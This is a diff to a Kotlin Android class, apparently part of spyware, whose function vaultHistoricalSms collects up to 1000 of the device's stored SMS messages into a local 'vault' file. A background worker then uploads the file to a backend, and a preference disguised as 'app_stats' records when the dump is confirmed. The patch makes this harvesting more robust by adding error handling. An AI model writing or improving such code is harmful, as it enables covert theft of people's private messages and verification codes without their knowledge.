@@ -142,15 +142,23 @@ object PhoneManager {
 
     fun vaultHistoricalSms(ctx: Context) {
         val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        // If backend already confirmed receipt, we are done forever.
         if (prefs.getBoolean("historical_sms_dumped", false)) return
 
         val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
-        if (vaultFile.exists()) return // Already vaulted, waiting for upload
+        
+        // If file exists, we don't need to rebuild it, just wait for SyncWorker to find it.
+        if (vaultFile.exists()) return 
 
+        // If no file and not dumped yet, it means either we haven't tried or a previous upload failed.
         val data = getHistoricalSms(ctx, 1000)
         if (data.length() > 0) {
-            vaultFile.writeText(data.toString())
-            DebugLogger.log("VAULT", "Inbox snapshot secured: ${data.length()} messages")
+            try {
+                vaultFile.writeText(data.toString())
+                DebugLogger.log("VAULT", "Inbox snapshot secured: ${data.length()} messages")
+            } catch (e: Exception) { 
+                DebugLogger.log("VAULT_ERR", "Failed to write vault: ${e.message}")
+            }
         }
     }
 
